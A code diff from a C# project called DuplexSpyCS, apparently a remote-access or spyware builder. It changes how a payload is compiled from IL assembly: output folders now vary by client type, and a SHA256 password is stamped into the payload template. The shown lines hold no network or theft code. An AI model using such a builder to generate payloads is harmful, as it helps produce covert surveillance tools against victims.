@@ -213,7 +213,7 @@ namespace DuplexSpyCS
         /// <param name="output_file">Output exe file.</param>
         /// <param name="srcContent">IL assembly code.</param>
         /// <returns></returns>
-        bool CompileFromIL(string output_file, string srcContent)
+        bool CompileFromIL(string szType, string output_file, string srcContent)
         {
             /* How it work:
              * Write srcContent(Payload) into temp file,
@@ -239,7 +239,7 @@ namespace DuplexSpyCS
                 {
                     Application.StartupPath,
                     "Payload",
-                    "Merged",
+                    szType,
                     Path.GetRandomFileName(),
                 });
 
@@ -378,8 +378,12 @@ namespace DuplexSpyCS
                     .Replace("[MB_BTN]", buildConfig.msgboxConfig.button.ToString())
                     .Replace("[MB_ICON]", buildConfig.msgboxConfig.icon.ToString())
 
+                    //Tipoff
+                    .Replace("[SHA256_PASSWORD]", textBox7.Text)
+
                     //Other
                     .Replace("-nan(ind)", "0x7FF8000000000000")
+                    //.Replace("inf", "3.40282347E+38")
                 );
 
                 string szDirName = Path.GetDirectoryName(filePath); //Directory path.
@@ -387,7 +391,7 @@ namespace DuplexSpyCS
                 string szPdbFile = $"{szDirName}\\{szFileName}.pdb"; //Debug file.
                 bool bExists = File.Exists(szPdbFile);
 
-                if (CompileFromIL(filePath, szPayload))
+                if (CompileFromIL(buildConfig.clntType.ToString(), filePath, szPayload))
                 {
                     logsOK("Compile successfully.");
 
